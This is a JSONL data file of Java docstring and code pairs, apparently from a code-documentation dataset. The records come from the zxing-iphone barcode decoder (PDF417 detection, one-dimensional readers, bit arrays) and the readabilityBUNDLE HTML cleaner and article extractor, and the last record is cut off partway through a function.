{"docstring": "/**\n * Logs the given message at the debug level.\n */\n", "func_signal": "public static void debug(String message)", "code": "{\n  EventLogger.logEvent(LOG_ID_LONG, message.getBytes(), EventLogger.DEBUG_INFO);\n  logToSystemOut(message);\n}", "path": "rim\\src\\com\\google\\zxing\\client\\rim\\util\\Log.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Determines how closely a set of observed counts of runs of black/white\n * values matches a given target pattern. This is reported as the ratio of\n * the total variance from the expected pattern proportions across all\n * pattern elements, to the length of the pattern.\n *\n * @param counters observed counters\n * @param pattern expected pattern\n * @param maxIndividualVariance The most any counter can differ before we give up\n * @return ratio of total variance between counters and pattern compared to\n *         total pattern size, where the ratio has been multiplied by 256.\n *         So, 0 means no variance (perfect match); 256 means the total\n *         variance between counters and patterns equals the pattern length,\n *         higher values mean even more variance\n */\n", "func_signal": "private static int patternMatchVariance(int[] counters, int[] pattern, int maxIndividualVariance)", "code": "{\n  int numCounters = counters.length;\n  int total = 0;\n  int patternLength = 0;\n  for (int i = 0; i < numCounters; i++) {\n    total += counters[i];\n    patternLength += pattern[i];\n  }\n  if (total < patternLength) {\n    // If we don't even have one pixel per unit of bar width, assume this\n    // is too small to reliably match, so fail:\n    return Integer.MAX_VALUE;\n  }\n  // We're going to fake floating-point math in integers. We just need to use more bits.\n  // Scale up patternLength so that intermediate values below like scaledCounter will have\n  // more \"significant digits\".\n  int unitBarWidth = (total << 8) / patternLength;\n  maxIndividualVariance = (maxIndividualVariance * unitBarWidth) >> 8;\n\n  int totalVariance = 0;\n  for (int x = 0; x < numCounters; x++) {\n    int counter = counters[x] << 8;\n    int scaledPattern = pattern[x] * unitBarWidth;\n    int variance = counter > scaledPattern ? counter - scaledPattern : scaledPattern - counter;\n    if (variance > maxIndividualVariance) {\n      return Integer.MAX_VALUE;\n    }\n    totalVariance += variance;\n  }\n  return totalVariance / total;\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Because we scan horizontally to detect the start and stop patterns, the vertical component of\n * the codeword coordinates will be slightly wrong if there is any skew or rotation in the image.\n * This method moves those points back onto the edges of the theoretically perfect bounding\n * quadrilateral if needed.\n *\n * @param vertices The eight vertices located by findVertices().\n */\n", "func_signal": "private static void correctCodeWordVertices(ResultPoint[] vertices, boolean upsideDown)", "code": "{\n  float skew = vertices[4].getY() - vertices[6].getY();\n  if (upsideDown) {\n    skew = -skew;\n  }\n  if (skew > SKEW_THRESHOLD) {\n    // Fix v4\n    float length = vertices[4].getX() - vertices[0].getX();\n    float deltax = vertices[6].getX() - vertices[0].getX();\n    float deltay = vertices[6].getY() - vertices[0].getY();\n    float correction = length * deltay / deltax;\n    vertices[4] = new ResultPoint(vertices[4].getX(), vertices[4].getY() + correction);\n  } else if (-skew > SKEW_THRESHOLD) {\n    // Fix v6\n    float length = vertices[2].getX() - vertices[6].getX();\n    float deltax = vertices[2].getX() - vertices[4].getX();\n    float deltay = vertices[2].getY() - vertices[4].getY();\n    float correction = length * deltay / deltax;\n    vertices[6] = new ResultPoint(vertices[6].getX(), vertices[6].getY() - correction);\n  }\n\n  skew = vertices[7].getY() - vertices[5].getY();\n  if (upsideDown) {\n    skew = -skew;\n  }\n  if (skew > SKEW_THRESHOLD) {\n    // Fix v5\n    float length = vertices[5].getX() - vertices[1].getX();\n    float deltax = vertices[7].getX() - vertices[1].getX();\n    float deltay = vertices[7].getY() - vertices[1].getY();\n    float correction = length * deltay / deltax;\n    vertices[5] = new ResultPoint(vertices[5].getX(), vertices[5].getY() + correction);\n  } else if (-skew > SKEW_THRESHOLD) {\n    // Fix v7\n    float length = vertices[3].getX() - vertices[7].getX();\n    float deltax = vertices[3].getX() - vertices[5].getX();\n    float deltay = vertices[3].getY() - vertices[5].getY();\n    float correction = length * deltay / deltax;\n    vertices[7] = new ResultPoint(vertices[7].getX(), vertices[7].getY() - correction);\n  }\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * @param matrix row of black/white values to search\n * @param column x position to start search\n * @param row y position to start search\n * @param width the number of pixels to search on this row\n * @param pattern pattern of counts of number of black and white pixels that are\n *                 being searched for as a pattern\n * @return start/end horizontal offset of guard pattern, as an array of two ints.\n */\n", "func_signal": "private static int[] findGuardPattern(BitMatrix matrix, int column, int row, int width,\n    boolean whiteFirst, int[] pattern)", "code": "{\n  int patternLength = pattern.length;\n  // TODO: Find a way to cache this array, as this method is called hundreds of times\n  // per image, and we want to allocate as seldom as possible.\n  int[] counters = new int[patternLength];\n  boolean isWhite = whiteFirst;\n\n  int counterPosition = 0;\n  int patternStart = column;\n  for (int x = column; x < column + width; x++) {\n    boolean pixel = matrix.get(x, row);\n    if (pixel ^ isWhite) {\n      counters[counterPosition]++;\n    } else {\n      if (counterPosition == patternLength - 1) {\n        if (patternMatchVariance(counters, pattern, MAX_INDIVIDUAL_VARIANCE) < MAX_AVG_VARIANCE) {\n          return new int[]{patternStart, x};\n        }\n        patternStart += counters[0] + counters[1];\n        for (int y = 2; y < patternLength; y++) {\n          counters[y - 2] = counters[y];\n        }\n        counters[patternLength - 2] = 0;\n        counters[patternLength - 1] = 0;\n        counterPosition--;\n      } else {\n        counterPosition++;\n      }\n      counters[counterPosition] = 1;\n      isWhite = !isWhite;\n    }\n  }\n  return null;\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Logs the given message at the error level.\n */\n", "func_signal": "public static void error(String message)", "code": "{\n  EventLogger.logEvent(LOG_ID_LONG, message.getBytes(), EventLogger.ERROR);\n  logToSystemOut(message);\n}", "path": "rim\\src\\com\\google\\zxing\\client\\rim\\util\\Log.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * We're going to examine rows from the middle outward, searching alternately above and below the\n * middle, and farther out each time. rowStep is the number of rows between each successive\n * attempt above and below the middle. So we'd scan row middle, then middle - rowStep, then\n * middle + rowStep, then middle - (2 * rowStep), etc.\n * rowStep is bigger as the image is taller, but is always at least 1. We've somewhat arbitrarily\n * decided that moving up and down by about 1/16 of the image is pretty good; we try more of the\n * image if \"trying harder\".\n *\n * @param image The image to decode\n * @param hints Any hints that were requested\n * @return The contents of the decoded barcode\n * @throws NotFoundException Any spontaneous errors which occur\n */\n", "func_signal": "private Result doDecode(BinaryBitmap image, Hashtable hints) throws NotFoundException", "code": "{\n  int width = image.getWidth();\n  int height = image.getHeight();\n  BitArray row = new BitArray(width);\n\n  int middle = height >> 1;\n  boolean tryHarder = hints != null && hints.containsKey(DecodeHintType.TRY_HARDER);\n  int rowStep = Math.max(1, height >> (tryHarder ? 8 : 5));\n  int maxLines;\n  if (tryHarder) {\n    maxLines = height; // Look at the whole image, not just the center\n  } else {\n    maxLines = 15; // 15 rows spaced 1/32 apart is roughly the middle half of the image\n  }\n\n  for (int x = 0; x < maxLines; x++) {\n\n    // Scanning from the middle out. Determine which row we're looking at next:\n    int rowStepsAboveOrBelow = (x + 1) >> 1;\n    boolean isAbove = (x & 0x01) == 0; // i.e. is x even?\n    int rowNumber = middle + rowStep * (isAbove ? rowStepsAboveOrBelow : -rowStepsAboveOrBelow);\n    if (rowNumber < 0 || rowNumber >= height) {\n      // Oops, if we run off the top or bottom, stop\n      break;\n    }\n\n    // Estimate black point for this row and load it:\n    try {\n      row = image.getBlackRow(rowNumber, row);\n    } catch (NotFoundException nfe) {\n      continue;\n    }\n\n    // While we have the image data in a BitArray, it's fairly cheap to reverse it in place to\n    // handle decoding upside down barcodes.\n    for (int attempt = 0; attempt < 2; attempt++) {\n      if (attempt == 1) { // trying again?\n        row.reverse(); // reverse the row and continue\n        // This means we will only ever draw result points *once* in the life of this method\n        // since we want to avoid drawing the wrong points after flipping the row, and,\n        // don't want to clutter with noise from every single row scan -- just the scans\n        // that start on the center line.\n        if (hints != null && hints.containsKey(DecodeHintType.NEED_RESULT_POINT_CALLBACK)) {\n          Hashtable newHints = new Hashtable(); // Can't use clone() in J2ME\n          Enumeration hintEnum = hints.keys();\n          while (hintEnum.hasMoreElements()) {\n            Object key = hintEnum.nextElement();\n            if (!key.equals(DecodeHintType.NEED_RESULT_POINT_CALLBACK)) {\n              newHints.put(key, hints.get(key));\n            }\n          }\n          hints = newHints;\n        }\n      }\n      try {\n        // Look for a barcode\n        Result result = decodeRow(rowNumber, row, hints);\n        // We found our barcode\n        if (attempt == 1) {\n          // But it was upside down, so note that\n          result.putMetadata(ResultMetadataType.ORIENTATION, new Integer(180));\n          // And remember to flip the result points horizontally.\n          ResultPoint[] points = result.getResultPoints();\n          points[0] = new ResultPoint(width - points[0].getX() - 1, points[0].getY());\n          points[1] = new ResultPoint(width - points[1].getX() - 1, points[1].getY());\n        }\n        return result;\n      } catch (ReaderException re) {\n        // continue -- just couldn't decode this row\n      }\n    }\n  }\n\n  throw NotFoundException.getNotFoundInstance();\n}", "path": "core\\src\\com\\google\\zxing\\oned\\OneDReader.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n *\n * @param bitOffset first bit to start writing\n * @param array array to write into. Bytes are written most-significant byte first. This is the opposite\n *  of the internal representation, which is exposed by {@link #getBitArray()}\n * @param offset position in array to start writing\n * @param numBytes how many bytes to write\n */\n", "func_signal": "public void toBytes(int bitOffset, byte[] array, int offset, int numBytes)", "code": "{\n  for (int i = 0; i < numBytes; i++) {\n    int theByte = 0;\n    for (int j = 0; j < 8; j++) {\n      if (get(bitOffset)) {\n        theByte |= 1 << (7 - j);\n      }\n      bitOffset++;\n    }\n    array[offset + i] = (byte) theByte;\n  }\n}", "path": "core\\src\\com\\google\\zxing\\common\\BitArray.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Computes the dimension (number of modules in a row) of the PDF417 Code\n * based on vertices of the codeword area and estimated module size.\n *\n * @param topLeft     of codeword area\n * @param topRight    of codeword area\n * @param bottomLeft  of codeword area\n * @param bottomRight of codeword are\n * @param moduleWidth estimated module size\n * @return the number of modules in a row.\n */\n", "func_signal": "private static int computeDimension(ResultPoint topLeft, ResultPoint topRight,\n    ResultPoint bottomLeft, ResultPoint bottomRight, float moduleWidth)", "code": "{\n  int topRowDimension = round(ResultPoint.distance(topLeft, topRight) / moduleWidth);\n  int bottomRowDimension = round(ResultPoint.distance(bottomLeft, bottomRight) / moduleWidth);\n  return ((((topRowDimension + bottomRowDimension) >> 1) + 8) / 17) * 17;\n  /*\n  * int topRowDimension = round(ResultPoint.distance(topLeft,\n  * topRight)); //moduleWidth); int bottomRowDimension =\n  * round(ResultPoint.distance(bottomLeft, bottomRight)); //\n  * moduleWidth); int dimension = ((topRowDimension + bottomRowDimension)\n  * >> 1); // Round up to nearest 17 modules i.e. there are 17 modules per\n  * codeword //int dimension = ((((topRowDimension + bottomRowDimension) >>\n  * 1) + 8) / 17) * 17; return dimension;\n  */\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Clears all bits (sets to false).\n */\n", "func_signal": "public void clear()", "code": "{\n  int max = bits.length;\n  for (int i = 0; i < max; i++) {\n    bits[i] = 0;\n  }\n}", "path": "core\\src\\com\\google\\zxing\\common\\BitArray.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Appends the least-significant bits, from value, in order from most-significant to\n * least-significant. For example, appending 6 bits from 0x000001E will append the bits\n * 0, 1, 1, 1, 1, 0 in that order.\n */\n", "func_signal": "public void appendBits(int value, int numBits)", "code": "{\n  if (numBits < 0 || numBits > 32) {\n    throw new IllegalArgumentException(\"Num bits must be between 0 and 32\");\n  }\n  ensureCapacity(size + numBits);\n  for (int numBitsLeft = numBits; numBitsLeft > 0; numBitsLeft--) {\n    appendBit(((value >> (numBitsLeft - 1)) & 0x01) == 1);\n  }\n}", "path": "core\\src\\com\\google\\zxing\\common\\BitArray.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "// Note that we don't try rotation without the try harder flag, even if rotation was supported.\n", "func_signal": "public Result decode(BinaryBitmap image, Hashtable hints) throws NotFoundException, FormatException", "code": "{\n  try {\n    return doDecode(image, hints);\n  } catch (NotFoundException nfe) {\n    boolean tryHarder = hints != null && hints.containsKey(DecodeHintType.TRY_HARDER);\n    if (tryHarder && image.isRotateSupported()) {\n      BinaryBitmap rotatedImage = image.rotateCounterClockwise();\n      Result result = doDecode(rotatedImage, hints);\n      // Record that we found it rotated 90 degrees CCW / 270 degrees CW\n      Hashtable metadata = result.getResultMetadata();\n      int orientation = 270;\n      if (metadata != null && metadata.containsKey(ResultMetadataType.ORIENTATION)) {\n        // But if we found it reversed in doDecode(), add in that result here:\n        orientation = (orientation +\n            ((Integer) metadata.get(ResultMetadataType.ORIENTATION)).intValue()) % 360;\n      }\n      result.putMetadata(ResultMetadataType.ORIENTATION, new Integer(orientation));\n      // Update result points\n      ResultPoint[] points = result.getResultPoints();\n      int height = rotatedImage.getHeight();\n      for (int i = 0; i < points.length; i++) {\n        points[i] = new ResultPoint(height - points[i].getY() - 1, points[i].getX());\n      }\n      return result;\n    } else {\n      throw nfe;\n    }\n  }\n}", "path": "core\\src\\com\\google\\zxing\\oned\\OneDReader.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Locate the vertices and the codewords area of a black blob using the Start\n * and Stop patterns as locators. This assumes that the image is rotated 180\n * degrees and if it locates the start and stop patterns at it will re-map\n * the vertices for a 0 degree rotation.\n * TODO: Change assumption about barcode location.\n * TODO: Scanning every row is very expensive. We should only do this for TRY_HARDER.\n *\n * @param matrix the scanned barcode image.\n * @return an array containing the vertices:\n *           vertices[0] x, y top left barcode\n *           vertices[1] x, y bottom left barcode\n *           vertices[2] x, y top right barcode\n *           vertices[3] x, y bottom right barcode\n *           vertices[4] x, y top left codeword area\n *           vertices[5] x, y bottom left codeword area\n *           vertices[6] x, y top right codeword area\n *           vertices[7] x, y bottom right codeword area\n */\n", "func_signal": "private static ResultPoint[] findVertices180(BitMatrix matrix)", "code": "{\n  int height = matrix.getHeight();\n  int width = matrix.getWidth();\n  int halfWidth = width >> 1;\n\n  ResultPoint[] result = new ResultPoint[8];\n  boolean found = false;\n\n  // Top Left\n  for (int i = height - 1; i > 0; i--) {\n    int[] loc = findGuardPattern(matrix, halfWidth, i, halfWidth, true, START_PATTERN_REVERSE);\n    if (loc != null) {\n      result[0] = new ResultPoint(loc[1], i);\n      result[4] = new ResultPoint(loc[0], i);\n      found = true;\n      break;\n    }\n  }\n  // Bottom Left\n  if (found) { // Found the Top Left vertex\n    found = false;\n    for (int i = 0; i < height; i++) {\n      int[] loc = findGuardPattern(matrix, halfWidth, i, halfWidth, true, START_PATTERN_REVERSE);\n      if (loc != null) {\n        result[1] = new ResultPoint(loc[1], i);\n        result[5] = new ResultPoint(loc[0], i);\n        found = true;\n        break;\n      }\n    }\n  }\n  // Top Right\n  if (found) { // Found the Bottom Left vertex\n    found = false;\n    for (int i = height - 1; i > 0; i--) {\n      int[] loc = findGuardPattern(matrix, 0, i, halfWidth, false, STOP_PATTERN_REVERSE);\n      if (loc != null) {\n        result[2] = new ResultPoint(loc[0], i);\n        result[6] = new ResultPoint(loc[1], i);\n        found = true;\n        break;\n      }\n    }\n  }\n  // Bottom Right\n  if (found) { // Found the Top Right vertex\n    found = false;\n    for (int i = 0; i < height; i++) {\n      int[] loc = findGuardPattern(matrix, 0, i, halfWidth, false, STOP_PATTERN_REVERSE);\n      if (loc != null) {\n        result[3] = new ResultPoint(loc[0], i);\n        result[7] = new ResultPoint(loc[1], i);\n        found = true;\n        break;\n      }\n    }\n  }\n  return found ? result : null;\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Locate the vertices and the codewords area of a black blob using the Start\n * and Stop patterns as locators.\n * TODO: Scanning every row is very expensive. We should only do this for TRY_HARDER.\n *\n * @param matrix the scanned barcode image.\n * @return an array containing the vertices:\n *           vertices[0] x, y top left barcode\n *           vertices[1] x, y bottom left barcode\n *           vertices[2] x, y top right barcode\n *           vertices[3] x, y bottom right barcode\n *           vertices[4] x, y top left codeword area\n *           vertices[5] x, y bottom left codeword area\n *           vertices[6] x, y top right codeword area\n *           vertices[7] x, y bottom right codeword area\n */\n", "func_signal": "private static ResultPoint[] findVertices(BitMatrix matrix)", "code": "{\n  int height = matrix.getHeight();\n  int width = matrix.getWidth();\n\n  ResultPoint[] result = new ResultPoint[8];\n  boolean found = false;\n\n  // Top Left\n  for (int i = 0; i < height; i++) {\n    int[] loc = findGuardPattern(matrix, 0, i, width, false, START_PATTERN);\n    if (loc != null) {\n      result[0] = new ResultPoint(loc[0], i);\n      result[4] = new ResultPoint(loc[1], i);\n      found = true;\n      break;\n    }\n  }\n  // Bottom left\n  if (found) { // Found the Top Left vertex\n    found = false;\n    for (int i = height - 1; i > 0; i--) {\n      int[] loc = findGuardPattern(matrix, 0, i, width, false, START_PATTERN);\n      if (loc != null) {\n        result[1] = new ResultPoint(loc[0], i);\n        result[5] = new ResultPoint(loc[1], i);\n        found = true;\n        break;\n      }\n    }\n  }\n  // Top right\n  if (found) { // Found the Bottom Left vertex\n    found = false;\n    for (int i = 0; i < height; i++) {\n      int[] loc = findGuardPattern(matrix, 0, i, width, false, STOP_PATTERN);\n      if (loc != null) {\n        result[2] = new ResultPoint(loc[1], i);\n        result[6] = new ResultPoint(loc[0], i);\n        found = true;\n        break;\n      }\n    }\n  }\n  // Bottom right\n  if (found) { // Found the Top right vertex\n    found = false;\n    for (int i = height - 1; i > 0; i--) {\n      int[] loc = findGuardPattern(matrix, 0, i, width, false, STOP_PATTERN);\n      if (loc != null) {\n        result[3] = new ResultPoint(loc[1], i);\n        result[7] = new ResultPoint(loc[0], i);\n        found = true;\n        break;\n      }\n    }\n  }\n  return found ? result : null;\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * RFC 2445 allows the start and end fields to be of type DATE (e.g. 20081021) or DATE-TIME\n * (e.g. 20081021T123000 for local time, or 20081021T123000Z for UTC).\n *\n * @param date The string to validate\n */\n", "func_signal": "private static void validateDate(String date)", "code": "{\n  if (date != null) {\n    int length = date.length();\n    if (length != 8 && length != 15 && length != 16) {\n      throw new IllegalArgumentException();\n    }\n    for (int i = 0; i < 8; i++) {\n      if (!Character.isDigit(date.charAt(i))) {\n        throw new IllegalArgumentException();\n      }\n    }\n    if (length > 8) {\n      if (date.charAt(8) != 'T') {\n        throw new IllegalArgumentException();\n      }\n      for (int i = 9; i < 15; i++) {\n        if (!Character.isDigit(date.charAt(i))) {\n          throw new IllegalArgumentException();\n        }\n      }\n      if (length == 16 && date.charAt(15) != 'Z') {\n        throw new IllegalArgumentException();\n      }\n    }\n  }\n}", "path": "core\\src\\com\\google\\zxing\\client\\result\\CalendarParsedResult.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Records the size of successive runs of white and black pixels in a row, starting at a given point.\n * The values are recorded in the given array, and the number of runs recorded is equal to the size\n * of the array. If the row starts on a white pixel at the given start point, then the first count\n * recorded is the run of white pixels starting from that point; likewise it is the count of a run\n * of black pixels if the row begin on a black pixels at that point.\n *\n * @param row row to count from\n * @param start offset into row to start at\n * @param counters array into which to record counts\n * @throws NotFoundException if counters cannot be filled entirely from row before running out\n *  of pixels\n */\n", "func_signal": "protected static void recordPattern(BitArray row, int start, int[] counters) throws NotFoundException", "code": "{\n  int numCounters = counters.length;\n  for (int i = 0; i < numCounters; i++) {\n    counters[i] = 0;\n  }\n  int end = row.getSize();\n  if (start >= end) {\n    throw NotFoundException.getNotFoundInstance();\n  }\n  boolean isWhite = !row.get(start);\n  int counterPosition = 0;\n  int i = start;\n  while (i < end) {\n    boolean pixel = row.get(i);\n    if (pixel ^ isWhite) { // that is, exactly one is true\n      counters[counterPosition]++;\n    } else {\n      counterPosition++;\n      if (counterPosition == numCounters) {\n        break;\n      } else {\n        counters[counterPosition] = 1;\n        isWhite = !isWhite;\n      }\n    }\n    i++;\n  }\n  // If we read fully the last section of pixels and filled up our counters -- or filled\n  // the last counter but ran off the side of the image, OK. Otherwise, a problem.\n  if (!(counterPosition == numCounters || (counterPosition == numCounters - 1 && i == end))) {\n    throw NotFoundException.getNotFoundInstance();\n  }\n}", "path": "core\\src\\com\\google\\zxing\\oned\\OneDReader.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Removing any null paras\n * \n * @param docToClean\n * @return\n */\n", "func_signal": "private void removeEmptyParas(Document docToClean)", "code": "{\n\tElements paras = docToClean.select(\"p\");\n\tfor(Element para : paras) {\n\t\tif(string.isNullOrEmpty(para.text()) && para.childNodes().size() == 0) {\n\t\t\tlogger.debug(\"Null Para found :\"+para + \"size : \"+para.childNodes().size());\n\t\t\tpara.remove();\n\t\t}\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * go through all the div's nodes and clean up dangling text nodes and get\n * rid of obvious jank\n */\n", "func_signal": "private Element getFlushedBuffer(StringBuilder replacementText, Document doc)", "code": "{\n\tString bufferedText = replacementText.toString();\n\tlogger.debug(\"Flushing TextNode Buffer: \" + bufferedText.trim());\n\tDocument newDoc = new Document(doc.baseUri());\n\tElement newPara = newDoc.createElement(\"p\");\n\tnewPara.html(bufferedText);\n\treturn newPara;\n\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * returns a list of nodes we want to search on like paragraphs and tables\n * \n * @return\n */\n", "func_signal": "private ArrayList<Element> getNodesToCheck(Document doc)", "code": "{\n\tArrayList<Element> nodesToCheck = new ArrayList<Element>();\n\n\tnodesToCheck.addAll(doc.getElementsByTag(\"p\"));\n\tnodesToCheck.addAll(doc.getElementsByTag(\"pre\"));\n\tnodesToCheck.addAll(doc.getElementsByTag(\"td\"));\n\treturn nodesToCheck;\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\extractor\\GooseExtractor.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Remove any style sheets attached\n * \n * @param docToClean\n * @return\n */\n", "func_signal": "private void removeStyleSheets(Document docToClean)", "code": "{\n\tElements stylesheets = docToClean.select(\"link[rel='stylesheet']\");\n\tlogger.debug(\"Removing \"+stylesheets.size() + \" style sheets\");\n\tstylesheets.remove();\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * The unique set of tags that matched: \"a[rel=tag], a[href*=/tag/]\"\n * \n * @return the unique set of TAGs extracted from this {@link Article}\n */\n", "func_signal": "public Set<String> getTags()", "code": "{\n\tif (tags == null) {\n\t\ttags = new HashSet<String>();\n\t}\n\treturn tags;\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\Article.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Remove #comment tags from document\n * \n * @param docToClean\n * @return\n */\n", "func_signal": "private void removeComments(Document docToClean)", "code": "{\n\tList<Node> childNodes = docToClean.childNodes();\n\tfor(Node node : childNodes) {\n\t\tcleanComments(node);\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Convert Font tags to Span tags\n *  \n * @param docToClean\n * @return\n */\n", "func_signal": "private void convertFontToSpan(Document docToClean)", "code": "{\n\tElements fonts = docToClean.getElementsByTag(\"font\");\n\tfor(Element font : fonts) {\n\t\tchangeElementTag(font, \"span\");\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * remove those css drop caps where they put the first letter in big text in\n * the 1st paragraph\n */\n", "func_signal": "private void removeDropCaps(Document doc)", "code": "{\n\tElements items = doc.select(\"span[class~=(dropcap|drop_cap)]\");\n\tlogger.debug(\"Cleaning \" + items.size() + \" dropcap tags\");\n\tfor (Element item : items) {\n\t\tTextNode tn = new TextNode(item.text(), doc.baseUri());\n\t\titem.replaceWith(tn);\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Get an elements class/id weight. Uses regular expressions to tell if this element looks good or bad.\n * \n * @param Element\n * @return number (Integer)\n **/\n", "func_signal": "public static double getClassWeight(Element element)", "code": "{\n    double weight = 0;\n    /* Look for a special classname */\n    String className = element.className();\n    if (!\"\".equals(className)) {\n        if (Patterns.exists(Patterns.NEGATIVE, className)) {\n            weight -= 25;\n        }\n        if (Patterns.exists(Patterns.POSITIVE, className)) {\n            weight += 25;\n        }\n    }\n\n    /* Look for a special ID */\n    String id = element.id();\n    if (!\"\".equals(id)) {\n        if (Patterns.exists(Patterns.NEGATIVE, id)) {\n            weight -= 25;\n        }\n        if (Patterns.exists(Patterns.POSITIVE, id)) {\n            weight += 25;\n        }\n    }\n    return weight;\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\WeightMethods.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * we're going to start looking for where the clusters of paragraphs are.\n * We'll score a cluster based on the number of stopwords and the number of\n * consecutive paragraphs together, which should form the cluster of text\n * that this node is around also store on how high up the paragraphs are,\n * comments are usually at the bottom and should get a lower score\n * \n * @return\n */\n", "func_signal": "private Element calculateBestNodeBasedOnClustering(Document doc)", "code": "{\n\tElement topNode = null;\n\n\t// grab all the paragraph elements on the page to start to inspect the\n\t// likely hood of them being good peeps\n\tArrayList<Element> nodesToCheck = getNodesToCheck(doc);\n\n\tdouble startingBoost = 1.0;\n\tint cnt = 0;\n\tint i = 0;\n\n\t// holds all the parents of the nodes we're checking\n\tSet<Element> parentNodes = new HashSet<Element>();\n\tArrayList<Element> nodesWithText = new ArrayList<Element>();\n\n\tfor (Element node : nodesToCheck) {\n\t\tString nodeText = node.text();\n\t\tWordStats wordStats = StopWords.getStopWordCount(nodeText);\n\t\tboolean highLinkDensity = isHighLinkDensity(node);\n\n\t\tif (wordStats.getStopWordCount() > 2 && !highLinkDensity) {\n\t\t\tnodesWithText.add(node);\n\t\t}\n\n\t}\n\n\tint numberOfNodes = nodesWithText.size();\n\tint negativeScoring = 0; // we shouldn't give more negatives than\n\t\t\t\t\t\t\t\t// positives\n\t// we want to give the last 20% of nodes negative scores in case they're\n\t// comments\n\tdouble bottomNodesForNegativeScore = (float) numberOfNodes * 0.25;\n\n\tlogger.debug(\"About to inspect num of nodes with text: \"+ numberOfNodes);\n\n\tfor (Element node : nodesWithText) {\n\t\tlogger.debug(\"NodesWithText : \" + node);\n\t\t// add parents and grandparents to scoring\n\t\t// only add boost to the middle paragraphs, top and bottom is\n\t\t// usually jankz city\n\t\t// so basically what we're doing is giving boost scores to\n\t\t// paragraphs that appear higher up in the dom\n\t\t// and giving lower, even negative scores to those who appear lower\n\t\t// which could be commenty stuff\n\n\t\tfloat boostScore = 0;\n\n\t\tif (isOkToBoost(node)) {\n\t\t\tif (cnt >= 0) {\n\t\t\t\tboostScore = (float) ((1.0 / startingBoost) * 50);\n\t\t\t\tstartingBoost++;\n\t\t\t}\n\t\t}\n\n\t\t// check for negative node values\n\t\tif (numberOfNodes > 15) {\n\t\t\tif ((numberOfNodes - i) <= bottomNodesForNegativeScore) {\n\t\t\t\tfloat booster = (float) bottomNodesForNegativeScore\n\t\t\t\t\t\t- (float) (numberOfNodes - i);\n\t\t\t\tboostScore = -(float) Math.pow(booster, (float) 2);\n\n\t\t\t\t// we don't want to score too highly on the negative side.\n\t\t\t\tfloat negscore = Math.abs(boostScore) + negativeScoring;\n\t\t\t\tif (negscore > 40) {\n\t\t\t\t\tboostScore = 